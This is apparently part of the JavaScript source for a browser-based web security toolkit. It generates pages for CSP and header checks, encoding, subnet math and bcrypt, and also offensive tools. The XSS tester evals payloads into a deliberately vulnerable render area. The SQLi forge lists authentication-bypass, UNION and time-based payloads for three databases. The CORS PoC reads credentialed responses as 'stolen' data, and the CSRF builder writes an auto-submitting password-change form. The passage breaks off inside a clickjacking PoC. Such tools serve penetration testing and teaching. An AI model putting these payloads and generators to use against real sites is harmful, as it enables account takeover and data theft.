      <div class="row"><input type="checkbox" id="scr-inline"> <label>'unsafe-inline'</label></div>
      <div class="row"><input type="checkbox" id="scr-eval"> <label>'unsafe-eval'</label></div>
      <div class="row"><input type="text" id="scr-custom"></div>
    </div>
    <div class="card">
      <h3>style-src</h3>
      <div class="row"><input type="checkbox" id="sty-self" checked> <label>'self'</label></div>
      <div class="row"><input type="checkbox" id="sty-inline" checked> <label>'unsafe-inline'</label></div>
      <div class="row"><input type="text" id="sty-custom"></div>
    </div>
    <div class="card">
      <h3>img-src</h3>
      <div class="row"><input type="checkbox" id="img-self" checked> <label>'self'</label></div>
      <div class="row"><input type="checkbox" id="img-data" checked> <label>data:</label></div>
      <div class="row"><input type="text" id="img-custom"></div>
    </div>
  </div>
  <div class="output-box">
    <strong>Generated Meta Tag:</strong><br><br>
    <div id="outTag">&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self';"&gt;</div><br><br>
    <strong>HTTP Header:</strong><br><br>
    <div id="outHead">Content-Security-Policy: default-src 'self';</div>
  </div>
<script>
function updateCSP() {
  let policies = [];
  let def = [];
  if(document.getElementById('def-self').checked) def.push("'self'");
  if(document.getElementById('def-none').checked) def.push("'none'");
  if(document.getElementById('def-custom').value) def.push(document.getElementById('def-custom').value);
  if(def.length) policies.push("default-src " + def.join(" "));

  let scr = [];
  if(document.getElementById('scr-self').checked) scr.push("'self'");
  if(document.getElementById('scr-inline').checked) scr.push("'unsafe-inline'");
  if(document.getElementById('scr-eval').checked) scr.push("'unsafe-eval'");
  if(document.getElementById('scr-custom').value) scr.push(document.getElementById('scr-custom').value);
  if(scr.length) policies.push("script-src " + scr.join(" "));

  let sty = [];
  if(document.getElementById('sty-self').checked) sty.push("'self'");
  if(document.getElementById('sty-inline').checked) sty.push("'unsafe-inline'");
  if(document.getElementById('sty-custom').value) sty.push(document.getElementById('sty-custom').value);
  if(sty.length) policies.push("style-src " + sty.join(" "));

  let img = [];
  if(document.getElementById('img-self').checked) img.push("'self'");
  if(document.getElementById('img-data').checked) img.push("data:");
  if(document.getElementById('img-custom').value) img.push(document.getElementById('img-custom').value);
  if(img.length) policies.push("img-src " + img.join(" "));

  const policyStr = policies.join("; ") + ";";
  document.getElementById('outTag').innerText = '<meta http-equiv="Content-Security-Policy" content="' + policyStr + '">';
  document.getElementById('outHead').innerText = 'Content-Security-Policy: ' + policyStr;
}
document.querySelectorAll('input').forEach(el => el.addEventListener('change', updateCSP));
document.querySelectorAll('input').forEach(el => el.addEventListener('keyup', updateCSP));
updateCSP();
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 3: XSS Generator
  // ═══════════════════════════════════════════
  function getXSSCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>XSS Payload Tester</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #ef4444; margin-top: 0; }
  .layout { display: flex; gap: 30px; flex-wrap: wrap; }
  .panel { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #1e293b; min-width: 300px; }
  textarea { width: 100%; height: 150px; background: #020617; border: 1px solid #334155; color: #ef4444; padding: 15px; border-radius: 8px; font-family: monospace; box-sizing: border-box; }
  .payload-btn { display: block; width: 100%; text-align: left; background: #1e293b; border: none; color: #cbd5e1; padding: 10px; margin-bottom: 5px; border-radius: 4px; cursor: pointer; font-family: monospace; font-size: 12px; }
  .payload-btn:hover { background: #ef4444; color: #fff; }
  #renderArea { background: #fff; padding: 20px; color: #000; min-height: 100px; border-radius: 4px; margin-top: 20px; border: 3px dashed #ef4444; }
</style>
</head>
<body>
  <h1>🐛 XSS Payload Generator & Tester</h1>
  <div class="layout">
    <div class="panel">
      <h3 style="color:#ef4444; margin-top:0;">Payload Library</h3>
      <button class="payload-btn" onclick="setPayload('<script>alert(1)<\\/script>')">Basic Script Tag</button>
      <button class="payload-btn" onclick="setPayload('<img src=x onerror=alert(1)>')">Image OnError</button>
      <button class="payload-btn" onclick="setPayload('<svg/onload=alert(1)>')">SVG OnLoad</button>
      <button class="payload-btn" onclick="setPayload('javascript:alert(1)')">JavaScript URI</button>
    </div>
    <div class="panel">
      <h3 style="color:#ef4444; margin-top:0;">Injection Arena</h3>
      <textarea id="xssInput" placeholder="Enter payload here..."></textarea>
      <h4 style="color:#ef4444;">Vulnerable Render Area:</h4>
      <div id="renderArea"></div>
    </div>
  </div>
<script>
  function setPayload(p) { document.getElementById('xssInput').value = p; triggerRender(); }
  function triggerRender() {
    const input = document.getElementById('xssInput').value;
    const arena = document.getElementById('renderArea');
    arena.innerHTML = input;
    const scripts = arena.getElementsByTagName('script');
    for (let i = 0; i < scripts.length; i++) { try { eval(scripts[i].innerText); } catch(e){} }
  }
  document.getElementById('xssInput').addEventListener('input', triggerRender);
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 4: Encoder Toolkit
  // ═══════════════════════════════════════════
  function getEncodeCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>Encoder Toolkit</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #a855f7; margin-top: 0; }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
  textarea { width: 100%; height: 120px; background: #0f172a; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 6px; box-sizing: border-box; font-family: monospace; resize: vertical; margin-bottom:10px; }
  h3 { color: #c084fc; font-size: 14px; margin-bottom: 5px; margin-top:0; }
  .box { background: rgba(15, 23, 42, 0.5); padding: 15px; border-radius: 8px; border: 1px solid #1e293b; }
</style>
</head>
<body>
  <h1>🧮 Super Encoder / Decoder</h1>
  <div style="margin-bottom:30px;">
    <h3>Raw Text Input</h3>
    <textarea id="rawInput" placeholder="Type text here..." style="border-color:#a855f7;"></textarea>
  </div>
  <div class="grid">
    <div class="box"><h3>Base64</h3><textarea id="outBase64" readonly></textarea></div>
    <div class="box"><h3>URL Encode</h3><textarea id="outUrl" readonly></textarea></div>
    <div class="box"><h3>Hex</h3><textarea id="outHex" readonly></textarea></div>
    <div class="box"><h3>HTML Entities</h3><textarea id="outHtml" readonly></textarea></div>
  </div>
<script>
  function toHex(str) { let r = ''; for(let i=0; i<str.length; i++) r += str.charCodeAt(i).toString(16) + ' '; return r.trim(); }
  function toHtml(str) { return str.replace(/[\\u00A0-\\u9999<>\\&]/g, function(i) { return '&#'+i.charCodeAt(0)+';'; }); }
  document.getElementById('rawInput').addEventListener('input', function(e) {
    const val = e.target.value;
    try { document.getElementById('outBase64').value = btoa(unescape(encodeURIComponent(val))); } catch(err) { document.getElementById('outBase64').value = "Error"; }
    document.getElementById('outUrl').value = encodeURIComponent(val);
    document.getElementById('outHex').value = toHex(val);
    document.getElementById('outHtml').value = toHtml(val);
  });
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 5: CIDR Calculator
  // ═══════════════════════════════════════════
  function getCIDRCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>CIDR & Subnet Calculator</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #0ea5e9; margin-top: 0; }
  .input-group { background: #0f172a; border: 1px solid #1e293b; padding: 20px; border-radius: 8px; display: inline-flex; gap: 15px; align-items: center; margin-bottom: 30px; flex-wrap: wrap; }
  input[type="text"] { background: #020617; border: 1px solid #0ea5e9; color: #fff; padding: 10px 15px; border-radius: 6px; font-family: monospace; font-size: 16px; width: 250px; }
  .results { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; max-width: 600px; }
  .res-card { background: #0f172a; border: 1px solid #1e293b; padding: 15px; border-radius: 8px; }
  .lbl { font-size: 11px; color: #94a3b8; text-transform: uppercase; font-weight: bold; margin-bottom: 5px; }
  .val { font-size: 18px; color: #38bdf8; font-family: monospace; }
</style>
</head>
<body>
  <h1>🌐 Subnet & CIDR Calculator</h1>
  <div class="input-group">
    <label style="font-weight:bold;">IP / CIDR:</label>
    <input type="text" id="cidrInput" value="192.168.1.0/24">
  </div>
  <div class="results" id="resGrid">
    <div class="res-card"><div class="lbl">IP Address</div><div class="val" id="rIP">-</div></div>
    <div class="res-card"><div class="lbl">Subnet Mask</div><div class="val" id="rMask">-</div></div>
    <div class="res-card"><div class="lbl">Network Address</div><div class="val" id="rNet">-</div></div>
    <div class="res-card"><div class="lbl">Broadcast Address</div><div class="val" id="rBroad">-</div></div>
    <div class="res-card" style="grid-column: 1 / -1;"><div class="lbl">Usable Host Range</div><div class="val" id="rRange">-</div></div>
  </div>
<script>
  function ip2long(ip) { return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0; }
  function long2ip(long) { return [ (long >>> 24) & 255, (long >>> 16) & 255, (long >>> 8) & 255, long & 255 ].join('.'); }
  function calculate() {
    const input = document.getElementById('cidrInput').value.trim();
    if(!input) return;
    let ipStr = input, cidr = 32;
    if(input.includes('/')) { const parts = input.split('/'); ipStr = parts[0]; cidr = parseInt(parts[1], 10); }
    try {
      const ipLong = ip2long(ipStr);
      const maskLong = cidr === 0 ? 0 : (~0 << (32 - cidr)) >>> 0;
      const netLong = (ipLong & maskLong) >>> 0;
      const broadLong = (netLong | ~maskLong) >>> 0;
      const hostMin = cidr >= 31 ? netLong : netLong + 1;
      const hostMax = cidr >= 31 ? broadLong : broadLong - 1;
      document.getElementById('rIP').innerText = ipStr;
      document.getElementById('rMask').innerText = long2ip(maskLong);
      document.getElementById('rNet').innerText = long2ip(netLong);
      document.getElementById('rBroad').innerText = long2ip(broadLong);
      document.getElementById('rRange').innerText = long2ip(hostMin) + " - " + long2ip(hostMax);
    } catch(e) {}
  }
  document.getElementById('cidrInput').addEventListener('input', calculate);
  calculate();
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 6: Bcrypt Generator / Verifier
  // ═══════════════════════════════════════════
  function getBcryptCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>Bcrypt Tool</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #ec4899; margin-top: 0; }
  .grid { display: flex; gap: 20px; flex-wrap: wrap; }
  .box { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #1e293b; min-width: 300px; }
  input, select { width: 100%; background: #020617; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 6px; box-sizing: border-box; margin-bottom: 15px; }
  button { width: 100%; padding: 10px; border-radius: 6px; background: #ec4899; color: #fff; border: none; font-weight: bold; cursor: pointer; }
  .output { margin-top: 15px; padding: 15px; background: #000; border: 1px dashed #ec4899; border-radius: 4px; font-family: monospace; word-break: break-all; }
  .success { color: #10b981; } .fail { color: #ef4444; }
</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bcryptjs/2.4.3/bcrypt.min.js"></script>
</head>
<body>
  <h1>🔒 Bcrypt Hash Tool</h1>
  <div class="grid">
    <div class="box">
      <h3 style="color:#ec4899; margin-top:0;">Generate Hash</h3>
      <label>Password:</label><input type="text" id="genPass" value="admin123">
      <label>Cost Factor:</label>
      <select id="genCost"><option value="8">8 (Fast)</option><option value="10" selected>10 (Default)</option><option value="12">12 (Secure)</option></select>
      <button onclick="generate()">Generate Hash</button>
      <div class="output" id="outHash">-</div>
    </div>
    <div class="box">
      <h3 style="color:#ec4899; margin-top:0;">Verify Hash</h3>
      <label>Password:</label><input type="text" id="verPass" placeholder="Enter password...">
      <label>Hash:</label><input type="text" id="verHash" placeholder="$2a$10$...">
      <button onclick="verify()" style="background:#10b981;">Verify Match</button>
      <div class="output" id="outMatch">-</div>
    </div>
  </div>
<script>
  function generate() {
    const pass = document.getElementById('genPass').value;
    const cost = parseInt(document.getElementById('genCost').value);
    const out = document.getElementById('outHash');
    out.innerHTML = "Generating...";
    setTimeout(() => {
      try {
        const bcrypt = window.dcodeIO ? window.dcodeIO.bcrypt : window.bcrypt;
        const salt = bcrypt.genSaltSync(cost);
        out.innerHTML = bcrypt.hashSync(pass, salt);
      } catch(e) { out.innerHTML = "Error: " + e.message; }
    }, 50);
  }
  function verify() {
    const pass = document.getElementById('verPass').value;
    const hash = document.getElementById('verHash').value;
    const out = document.getElementById('outMatch');
    out.innerHTML = "Verifying...";
    setTimeout(() => {
      try {
        const bcrypt = window.dcodeIO ? window.dcodeIO.bcrypt : window.bcrypt;
        if(bcrypt.compareSync(pass, hash)) out.innerHTML = "<span class='success'>✅ MATCH!</span>";
        else out.innerHTML = "<span class='fail'>❌ FAILED</span>";
      } catch(e) { out.innerHTML = "<span class='fail'>Invalid hash format.</span>"; }
    }, 50);
  }
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 7: Headers Analyzer
  // ═══════════════════════════════════════════
  function getHeadersCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>Headers Analyzer</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #f97316; margin-top: 0; }
  .grid { display: flex; gap: 20px; flex-wrap: wrap; }
  .box { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #1e293b; min-width: 300px; }
  textarea { width: 100%; height: 200px; background: #020617; border: 1px solid #334155; color: #fff; padding: 15px; border-radius: 6px; box-sizing: border-box; font-family: monospace; resize:vertical;}
  button { width: 100%; padding: 12px; border-radius: 6px; background: #f97316; color: #fff; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
  .res-item { background: #020617; border: 1px solid #1e293b; padding: 10px 15px; margin-bottom: 10px; border-radius: 6px; display: flex; align-items: center; justify-content: space-between; }
  .badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
  .badge.ok { background: rgba(16,185,129,0.2); color: #10b981; }
  .badge.warn { background: rgba(239,68,68,0.2); color: #ef4444; }
  .score-circ { width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: bold; border: 4px solid #334155; margin: 0 auto 20px; }
</style>
</head>
<body>
  <h1>📋 HTTP Security Headers</h1>
  <div class="grid">
    <div class="box" style="flex:1;">
      <textarea id="hInput" placeholder="HTTP/1.1 200 OK\\nServer: nginx\\n..."></textarea>
      <button onclick="analyze()">Analyze Headers</button>
    </div>
    <div class="box" style="flex:2;">
      <div id="scoreCirc" class="score-circ">-</div>
      <div id="results"></div>
    </div>
  </div>
<script>
  const requiredHeaders = [
    { key: 'strict-transport-security', name: 'Strict-Transport-Security (HSTS)' },
    { key: 'x-frame-options', name: 'X-Frame-Options' },
    { key: 'x-content-type-options', name: 'X-Content-Type-Options' },
    { key: 'content-security-policy', name: 'Content-Security-Policy' },
    { key: 'referrer-policy', name: 'Referrer-Policy' }
  ];
  function analyze() {
    const lines = document.getElementById('hInput').value.toLowerCase().split('\\n');
    let foundKeys = lines.map(l => l.split(':')[0].trim());
    let score = 0, html = '';
    requiredHeaders.forEach(rh => {
      const isFound = foundKeys.includes(rh.key);
      if(isFound) score++;
      html += \`<div class="res-item">
        <strong style="color:#e2e8f0;">\${rh.name}</strong>
        <span class="badge \${isFound ? 'ok' : 'warn'}">\${isFound ? 'PRESENT' : 'MISSING'}</span>
      </div>\`;
    });
    document.getElementById('results').innerHTML = html;
    const circ = document.getElementById('scoreCirc');
    const letter = score === 5 ? 'A+' : score >= 4 ? 'A' : score >= 3 ? 'B' : score >= 1 ? 'C' : 'F';
    const color = score >= 4 ? '#10b981' : score >= 2 ? '#f59e0b' : '#ef4444';
    circ.innerText = letter; circ.style.borderColor = color; circ.style.color = color;
  }
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 8: SQLi Forge
  // ═══════════════════════════════════════════
  function getSqliCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>SQLi Forge</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #eab308; margin-top: 0; }
  .grid { display: flex; gap: 20px; flex-wrap: wrap; }
  .box { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #1e293b; min-width: 300px; }
  select { width: 100%; background: #020617; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 6px; margin-bottom: 15px; }
  .payload-box { background: #000; border-left: 4px solid #eab308; padding: 15px; font-family: monospace; color: #38bdf8; margin-bottom: 10px; font-size: 13px; }
</style>
</head>
<body>
  <h1>🕵️ SQLi Payload Forge</h1>
  <div class="grid">
    <div class="box" style="flex:1;">
      <label>Target DBMS:</label>
      <select id="dbms">
        <option value="mysql">MySQL / MariaDB</option>
        <option value="postgres">PostgreSQL</option>
        <option value="mssql">MS SQL Server</option>
      </select>
      <label>Attack Technique:</label>
      <select id="tech">
        <option value="auth">Authentication Bypass</option>
        <option value="union">UNION Based (Data)</option>
        <option value="time">Time Based (Blind)</option>
      </select>
    </div>
    <div class="box" style="flex:2;">
      <div id="outputArea"></div>
    </div>
  </div>
<script>
  const payloads = {
    mysql: {
      auth: ["admin' -- -", "admin' #", "' OR 1=1 #"],
      union: ["' UNION SELECT null,@@version,null -- -", "' UNION SELECT user(),database(),version() -- -"],
      time: ["' OR SLEEP(5) -- -", "1' AND (SELECT SLEEP(5)) -- -"]
    },
    postgres: {
      auth: ["admin' --", "' OR 1=1 --"],
      union: ["' UNION SELECT NULL,version(),NULL --"],
      time: ["' OR pg_sleep(5) --", "1; SELECT pg_sleep(5) --"]
    },
    mssql: {
      auth: ["admin' --", "' OR 1=1 --"],
      union: ["' UNION SELECT @@version,NULL,NULL --"],
      time: ["' WAITFOR DELAY '0:0:5' --"]
    }
  };
  function update() {
    const db = document.getElementById('dbms').value;
    const tc = document.getElementById('tech').value;
    let list = payloads[db][tc] || ["Not available."];
    let html = '';
    list.forEach(p => { html += \`<div class="payload-box">\${p.replace(/</g, '&lt;')}</div>\`; });
    document.getElementById('outputArea').innerHTML = html;
  }
  document.getElementById('dbms').addEventListener('change', update);
  document.getElementById('tech').addEventListener('change', update);
  update();
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 9: CORS Tester
  // ═══════════════════════════════════════════
  function getCorsCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>CORS Exploit Tester</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #6366f1; margin-top: 0; }
  .grid { display: flex; gap: 20px; flex-wrap: wrap; }
  .box { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #1e293b; min-width: 300px; }
  input { width: 100%; background: #020617; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 6px; box-sizing: border-box; margin-bottom: 15px; }
  button { width: 100%; padding: 12px; border-radius: 6px; background: #6366f1; color: #fff; border: none; font-weight: bold; cursor: pointer; }
  .code-area { background: #000; border: 1px solid #334155; padding: 15px; border-radius: 6px; font-family: monospace; color: #a5b4fc; white-space: pre-wrap; font-size: 13px; margin-top: 15px; }
  .demo-area { border: 2px dashed #6366f1; padding: 15px; border-radius: 6px; margin-top: 20px; }
</style>
</head>
<body>
  <h1>🕸️ CORS Exploit Tester</h1>
  <div class="grid">
    <div class="box">
      <h3 style="color:#6366f1; margin-top:0;">Target API URL</h3>
      <input type="text" id="apiUrl" value="https://api.github.com">
      <button onclick="generatePOC()">Generate POC HTML</button>
      <div class="code-area" id="pocCode"></div>
    </div>
    <div class="box">
      <h3 style="color:#6366f1; margin-top:0;">Live Browser Test</h3>
      <button onclick="testCORS()" style="background:#10b981;">Execute Live Fetch</button>
      <div class="demo-area">
        <strong style="color:#cbd5e1;">Response:</strong>
        <div id="liveRes" style="margin-top:10px; font-family:monospace; color:#ef4444; word-break:break-all;">Awaiting execution...</div>
      </div>
    </div>
  </div>
<script>
  function generatePOC() {
    const url = document.getElementById('apiUrl').value;
    const code = \`<!DOCTYPE html>
<html>
<body>
  <h2>CORS POC</h2>
  <script>
    var req = new XMLHttpRequest();
    req.onload = function() { alert("Data stolen: " + req.responseText); };
    req.open('GET', '\${url}', true);
    req.withCredentials = true;
    req.send();
  <\\/script>
</body>
</html>\`;
    document.getElementById('pocCode').textContent = code;
  }
  function testCORS() {
    const url = document.getElementById('apiUrl').value;
    const resDiv = document.getElementById('liveRes');
    resDiv.style.color = '#eab308'; resDiv.innerText = "Fetching...";
    fetch(url, { method: 'GET' })
      .then(r => r.text())
      .then(data => {
        resDiv.style.color = '#10b981';
        resDiv.innerText = "SUCCESS! CORS is open.\\n\\n" + data.substring(0, 150) + "...";
      })
      .catch(e => {
        resDiv.style.color = '#ef4444';
        resDiv.innerText = "BLOCKED: " + e.message;
      });
  }
  generatePOC();
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 10: CSRF Payload Builder
  // ═══════════════════════════════════════════
  function getCSRFCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>CSRF Payload Builder</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #f43f5e; margin-top: 0; }
  .grid { display: flex; gap: 20px; flex-wrap: wrap; }
  .box { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #1e293b; min-width: 300px; }
  input, select { width: 100%; background: #020617; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 6px; box-sizing: border-box; margin-bottom: 15px; }
  button { width: 100%; padding: 12px; border-radius: 6px; background: #f43f5e; color: #fff; border: none; font-weight: bold; cursor: pointer; }
  .code-area { background: #000; border: 1px solid #334155; padding: 15px; border-radius: 6px; font-family: monospace; color: #fda4af; white-space: pre-wrap; font-size: 13px; margin-top: 15px; height: 150px; overflow-y: auto; }
</style>
</head>
<body>
  <h1>🎭 CSRF Payload Builder</h1>
  <div class="grid">
    <div class="box">
      <h3 style="color:#f43f5e; margin-top:0;">Target Configuration</h3>
      <label>Target URL:</label>
      <input type="text" id="targetUrl" value="https://example.com/api/change_password">
      <label>Method:</label>
      <select id="methodMode">
        <option value="POST">POST</option>
        <option value="GET">GET</option>
      </select>
      <label>Parameters (JSON format):</label>
      <input type="text" id="params" value='{"new_pass": "hacked123", "confirm": "hacked123"}'>
      <button onclick="generateCSRF()">Generate POC HTML</button>
    </div>
    <div class="box">
      <h3 style="color:#f43f5e; margin-top:0;">Generated Auto-Submit Form</h3>
      <div class="code-area" id="pocCode"></div>
      <button onclick="copyCode()" style="margin-top:10px; background:#475569;">Copy Code to Clipboard</button>
    </div>
  </div>
<script>
  function generateCSRF() {
    const url = document.getElementById('targetUrl').value;
    const method = document.getElementById('methodMode').value;
    let paramsObj = {};
    try { 
      paramsObj = JSON.parse(document.getElementById('params').value); 
    } catch(e) { 
      alert("Invalid JSON parameters format."); return; 
    }
    
    let inputs = '';
    for(let key in paramsObj) {
      inputs += \`      <input type="hidden" name="\${key}" value="\${paramsObj[key]}" />\\n\`;
    }
    
    const code = \`<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <h2>Please wait... Loading content...</h2>
    <form action="\${url}" method="\${method}">
\${inputs}    </form>
  </body>
</html>\`;
    document.getElementById('pocCode').textContent = code;
  }
  function copyCode() {
    navigator.clipboard.writeText(document.getElementById('pocCode').textContent);
    alert('Code copied to clipboard!');
  }
  generateCSRF();
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 11: Image Steganography
  // ═══════════════════════════════════════════
  function getStegoCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>Image Steganography</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; }
  h1 { color: #14b8a6; margin-top: 0; }
  .grid { display: flex; gap: 20px; flex-wrap: wrap; }
  .box { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #1e293b; min-width: 300px; }
  input, textarea { width: 100%; background: #020617; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 6px; box-sizing: border-box; margin-bottom: 15px; }
  button { width: 100%; padding: 12px; border-radius: 6px; background: #14b8a6; color: #000; border: none; font-weight: bold; cursor: pointer; }
  canvas { display: none; }
  #preview { max-width: 100%; border: 1px dashed #14b8a6; margin-top: 15px; border-radius: 6px; }
</style>
</head>
<body>
  <h1>🖼️ Image Steganography Engine</h1>
  <div class="grid">
    <div class="box">
      <h3 style="color:#14b8a6; margin-top:0;">Encode Message</h3>
      <label>Select Image (PNG/JPG):</label>
      <input type="file" id="imgUpload" accept="image/*">
      <label>Secret Message:</label>
      <textarea id="secretMsg" rows="3" placeholder="Enter secret text..."></textarea>
      <button onclick="encodeMessage()">Encode & Download Image</button>
      <img id="preview" />
      <canvas id="canvas"></canvas>
    </div>
    <div class="box">
      <h3 style="color:#14b8a6; margin-top:0;">Decode Message</h3>
      <label>Upload Encoded Image (PNG):</label>
      <input type="file" id="imgDecode" accept="image/png">
      <button onclick="decodeMessage()">Extract Hidden Text</button>
      <h4 style="margin-top:20px;">Extracted Message:</h4>
      <textarea id="extractedMsg" rows="5" readonly style="border-color:#14b8a6; color:#14b8a6;"></textarea>
    </div>
  </div>
<script>
  let loadedImage = null;
  document.getElementById('imgUpload').addEventListener('change', function(e) {
    const reader = new FileReader();
    reader.onload = function(event) {
      loadedImage = new Image();
      loadedImage.onload = function() { document.getElementById('preview').src = loadedImage.src; };
      loadedImage.src = event.target.result;
    }
    if(e.target.files[0]) reader.readAsDataURL(e.target.files[0]);
  });

  function encodeMessage() {
    if(!loadedImage) return alert("Upload an image first.");
    const msg = document.getElementById('secretMsg').value;
    if(!msg) return alert("Enter a message.");
    
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = loadedImage.width;
    canvas.height = loadedImage.height;
    ctx.drawImage(loadedImage, 0, 0);
    
    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const data = imgData.data;
    
    const msgBytes = new TextEncoder().encode(msg + '\\0');
    if(msgBytes.length * 8 > data.length / 4) return alert("Message too long for this image.");
    
    let bitIdx = 0;
    for(let i=0; i<data.length; i+=4) {
      if(bitIdx < msgBytes.length * 8) {
        const byteIdx = Math.floor(bitIdx / 8);
        const bit = (msgBytes[byteIdx] >> (7 - (bitIdx % 8))) & 1;
        data[i] = (data[i] & ~1) | bit; // modify Red channel LSB
        bitIdx++;
      } else break;
    }
    
    ctx.putImageData(imgData, 0, 0);
    const link = document.createElement('a');
    link.download = 'stego_encoded.png';
    link.href = canvas.toDataURL('image/png');
    link.click();
  }

  function decodeMessage() {
    const file = document.getElementById('imgDecode').files[0];
    if(!file) return alert("Upload an encoded PNG image first.");
    
    const reader = new FileReader();
    reader.onload = function(event) {
      const img = new Image();
      img.onload = function() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = img.width; canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
        
        const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
        let bytes = [];
        let currByte = 0;
        let bitIdx = 0;
        
        for(let i=0; i<data.length; i+=4) {
          const bit = data[i] & 1;
          currByte = (currByte << 1) | bit;
          bitIdx++;
          if(bitIdx === 8) {
            if(currByte === 0) break; // Null terminator found
            bytes.push(currByte);
            currByte = 0;
            bitIdx = 0;
          }
        }
        document.getElementById('extractedMsg').value = new TextDecoder().decode(new Uint8Array(bytes));
      };
      img.src = event.target.result;
    }
    reader.readAsDataURL(file);
  }
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 12: Clickjacking POC
  // ═══════════════════════════════════════════
  function getClickjackCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>Clickjacking POC Creator</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #8b5cf6; margin-top: 0; }
  .grid { display: flex; gap: 20px; flex-wrap: wrap; }
  .box { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #1e293b; min-width: 300px; }
  input { width: 100%; background: #020617; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 6px; box-sizing: border-box; margin-bottom: 15px; }
  button { width: 100%; padding: 12px; border-radius: 6px; background: #8b5cf6; color: #fff; border: none; font-weight: bold; cursor: pointer; }
  .poc-area { border: 2px dashed #8b5cf6; margin-top: 20px; height: 400px; position: relative; overflow: hidden; background: #0f172a; }
  .poc-btn { position: absolute; top: 150px; left: 150px; padding: 20px 40px; background: #10b981; color: #fff; font-size: 20px; font-weight: bold; border-radius: 8px; cursor: pointer; border: none; z-index: 1; box-shadow: 0 4px 15px rgba(16,185,129,0.4); }
  iframe { position: absolute; top: 0; left: 0; width: 800px; height: 600px; border: none; z-index: 2; opacity: 0.5; background: #fff; } 
</style>
</head>
<body>
  <h1>🪟 Clickjacking POC</h1>
  <div class="grid">
    <div class="box">
      <h3 style="color:#8b5cf6; margin-top:0;">Configuration</h3>
      <label>Target URL (Must lack X-Frame-Options):</label>
      <input type="text" id="targetUrl" value="https://example.com">
      <label>Iframe Opacity (Demonstration):</label>
